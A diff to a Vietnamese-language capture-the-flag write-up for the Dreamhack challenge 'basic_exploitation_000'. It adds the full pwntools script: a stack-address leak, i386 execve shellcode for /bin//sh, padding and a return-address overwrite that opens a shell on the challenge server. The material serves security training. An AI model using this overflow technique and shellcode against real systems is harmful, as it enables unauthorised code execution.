@@ -95,14 +95,59 @@ payload += p32(leak_stack)
 
 ![image](https://user-images.githubusercontent.com/111769169/227440520-89a111c1-4d1b-4948-b874-2808ba4cb250.png)
 
-- oke đúng rùi và chạy thử xem 
+- oke đúng rùi và chạy thử xem
 
 ![image](https://user-images.githubusercontent.com/111769169/227440857-46774908-a9ed-4458-893a-3cfff48735e4.png)
 
 ## Kết quả
+
 ![image](https://user-images.githubusercontent.com/111769169/227441588-08d8c53a-8e64-4dbc-ba04-6ee247170f92.png)
 lưu ý ta nên cat flag luôn vì chương trình có thời gian ngắt
 
+<details> <summary> full script </summary>
+
+```python
+from pwn import *
+exe = ELF("./basic_exploitation_000")
+# r = process(exe.path)
+r = remote("host3.dreamhack.games", 13851)
+# gdb.attach(r, gdbscript='''
+#            b* main+42
+#            c
+#            ''')
+
+input()
+r.recvuntil(b'(')
+leak_stack = r.recv(10).decode()
+log.info("leak stack: " + leak_stack)
+
+leak_stack = int(leak_stack, 16)
+
+shellcode = asm(
+    '''
+    xor    eax,eax
+    push   eax
+    push   0x68732f6e
+    push   0x69622f2f
+    mov    ebx,esp
+    xor    ecx,ecx
+    xor    edx,edx
+    mov    al,0x8
+    inc    eax
+    inc    eax
+    inc    eax
+    int    0x80
+     ''', arch="i386"
+)
+payload = shellcode
+payload = payload.ljust(132, b"a")
+payload += p32(leak_stack)
+r.sendlineafter(b")\n", payload)
+
+r.interactive()
+```
+
+</details>
 
 # shell_basic
 
